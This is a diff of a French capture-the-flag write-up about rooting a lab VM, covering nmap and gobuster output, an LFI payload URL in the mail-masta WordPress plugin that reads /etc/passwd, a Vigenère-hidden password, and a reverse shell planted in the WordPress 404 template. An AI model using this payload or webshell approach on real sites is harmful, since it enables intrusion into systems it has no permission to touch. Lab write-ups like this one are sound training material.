@@ -5,7 +5,8 @@ Ca fait un moment que je n'ai pas pu faire de VM, j'ai un peu de temps libre, al
 
 Voici une des nombreuses façons de root cette VM. 
 
-# NMAP
+# Enumeration
+## NMAP
 ```
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-22 04:31 EDT
 Nmap scan report for 10.10.21.127
@@ -40,13 +41,13 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 25.89 seconds
 ```
-# FTP
+## FTP
 Le ftp accepte les connexions anonyme mais il est vide et on peu rien upload, peut-être qu'il sera utile plus tard ?
 
-# SSH 
+## SSH 
 Un port SSH, basic, sans bavure ! 
 
-# Serveur web
+## Serveur web
 Le site est une page par defaut de ubuntu
 
 ## Gobuster
@@ -69,10 +70,27 @@ Starting gobuster in directory enumeration mode
 /hackathons           (Status: 200) [Size: 197]
 ```
 
-### /wordpress
+## /wordpress
 Une fois sur le wordpress, en utilisant wpscan on sait qu'il utilise le plugin mail-masta qui est vulnerable au LFI:
 Payload : http://10.10.233.10/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 
+## /hackatons
+Une page avec qu'un text où il est écris : Damn how much I hate the smell of Vinegar :/ !!! 
+
+Mais dans les commentaires de la page on retrouve:
+```
+<!-- Dvc W@i[...REDACTED...] -->
+<!-- KeepGoing -->
+```
+
+C'est encoder en vigenère. (Vinegar / Vigenère.... merci le hint !)
+
+La clé est KeepGoing
+Cela donne : Try H@[...REDACTED...]3
+
+Qui est le mot de passe de **elyana**.
+
+# Exploitation
 On test donc !
 
 Retour:
@@ -103,23 +121,6 @@ define( 'DB_PASSWORD', 'H@[...REDACTED...]3' );
 ```
 Le compte fonctionne sur wordpress. Nous avons donc un accès.
 
-### /hackatons
-Une page avec qu'un text où il est écris : Damn how much I hate the smell of Vinegar :/ !!! 
-
-Mais dans les commentaires de la page on retrouve:
-```
-<!-- Dvc W@i[...REDACTED...] -->
-<!-- KeepGoing -->
-```
-
-C'est encoder en vigenère. (Vinegar / Vigenère.... merci le hint !)
-
-La clé est KeepGoing
-Cela donne : Try H@[...REDACTED...]3
-
-Qui est le mot de passe de **elyana**.
-
-# Get the revshell !
 Maintenant que nous avons l'accès a la page admin du wordpress, on va tout simplement modifier la page d'erreur 404 pour y mettre notre revshell.
 Ensuite, plus qu'a générer une page 404 et nous voila avec un revshell:
 
@@ -136,7 +137,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ 
 ```
 
-# Privesc
+# Post exploitation
 Un petit coup de linpeas, on trouve quelques trucs cool comme un containeur LXC 
 ```
 Running LXC Containers
